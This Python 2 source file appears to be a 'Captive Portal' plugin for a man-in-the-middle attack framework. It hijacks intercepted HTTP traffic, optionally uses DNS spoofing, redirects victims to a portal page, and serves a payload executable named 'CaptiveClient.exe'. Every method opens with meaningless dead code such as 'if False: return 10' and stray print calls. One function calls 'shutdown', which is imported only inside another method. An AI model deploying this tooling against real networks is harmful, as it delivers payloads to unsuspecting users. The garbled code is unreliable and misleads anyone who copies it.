from plugins.plugin import Plugin
from urlparse import urlparse

class Captive(Plugin):
    name = 'Captive Portal'
    optname = 'captive'
    tree_info = ['Captive Portal online']
    desc = 'Be a captive portal!'
    version = '0.1'

    def initialize(self, options):
        if False:
            return 10
        self.options = options
        from core.utils import shutdown
        if options.portalurl:
            self.portalurl = options.portalurl
        else:
            self.hostname = 'captive.portal' if self.options.usedns else self.options.ip
            if options.portaldir:
                self.serve_dir(options.portaldir)
            else:
                self.serve_portal()

    def response(self, response, request, data):
        if False:
            return 10
        if urlparse(self.portalurl).hostname not in request.headers['host']:
            self.clientlog.info('Redirecting to captive portal {}'.format(self.portalurl), extra=request.clientInfo)
            response.headers = {}
            data = '<html>\n            <body>\n            <p>Please click <a href="{}">here</a> if you are not redirected automatically</p>\n            </body></html>\n            '.format(self.portalurl)
            response.redirect(self.portalurl)
        return {'response': response, 'request': request, 'data': data}

    def options(self, options):
        if False:
            for i in range(10):
                print('nop')
        ' captive can be either run redirecting to a specified url (--portalurl), serve the payload locally (no argument) or \n        start an instance of SimpleHTTPServer to serve the LOCALDIR (--portaldir) '
        group = options.add_mutually_exclusive_group(required=False)
        group.add_argument('--portalurl', dest='portalurl', metavar='URL', help='Specify the URL where the portal is located, e.g. http://example.com.')
        group.add_argument('--portaldir', dest='portaldir', metavar='LOCALDIR', help='Specify a local path containg the portal files served with a SimpleHTTPServer on a different port (see config).')
        options.add_argument('--use-dns', dest='usedns', action='store_true', help='Whether we use dns spoofing to serve from a fancier portal URL captive.portal when used without options or portaldir. Requires DNS for "captive.portal" to resolve, e.g. via configured dns spoofing --dns.')

    def on_shutdown(self):
        if False:
            for i in range(10):
                print('nop')
        'This will be called when shutting down'
        pass

    def serve_portal(self):
        if False:
            print('Hello World!')
        self.portalurl = 'http://{}/portal.html'.format(self.hostname)
        from core.servers.HTTP import HTTP
        HTTP.add_static_endpoint('portal.html', 'text/html', './config/captive/portal.html')
        HTTP.add_static_endpoint('CaptiveClient.exe', 'application/octet-stream', self.config['Captive']['PayloadFilename'])
        self.tree_info.append('Portal login served by built-in HTTP server.')

    def serve_dir(self, dir):
        if False:
            i = 10
            return i + 15
        import threading
        import posixpath
        import urllib
        import os
        from SimpleHTTPServer import SimpleHTTPRequestHandler
        from BaseHTTPServer import HTTPServer as ServerClass
        Protocol = 'HTTP/1.0'
        port = self.config['Captive']['Port']
        ServerString = self.config['Captive']['ServerString']
        self.portalurl = 'http://{}:{}/'.format(self.hostname, port)
        ROUTES = (['', dir],)

        class HandlerClass(SimpleHTTPRequestHandler):
            """HandlerClass adapted from https://gist.github.com/creativeaura/5546779"""

            def translate_path(self, path):
                if False:
                    return 10
                'translate path given routes'
                root = os.getcwd()
                for (pattern, rootdir) in ROUTES:
                    if path.startswith(pattern):
                        path = path[len(pattern):]
                        root = rootdir
                        break
                path = path.split('?', 1)[0]
                path = path.split('#', 1)[0]
                path = posixpath.normpath(urllib.unquote(path))
                words = path.split('/')
                words = filter(None, words)
                path = root
                for word in words:
                    (drive, word) = os.path.splitdrive(word)
                    (head, word) = os.path.split(word)
                    if word in (os.curdir, os.pardir):
                        continue
                    path = os.path.join(path, word)
                return path
        server_address = ('0.0.0.0', int(port))
        HandlerClass.protocol_version = Protocol
        HandlerClass.server_version = ServerString
        httpd = ServerClass(server_address, HandlerClass)
        ServerClass.path = dir
        sa = httpd.socket.getsockname()
        try:
            t = threading.Thread(name='PortalServer', target=httpd.serve_forever)
            t.setDaemon(True)
            t.start()
            self.tree_info.append('Portal Server instance running on port {} serving {}'.format(port, dir))
        except Exception as e:
            shutdown('Failed to start Portal Server')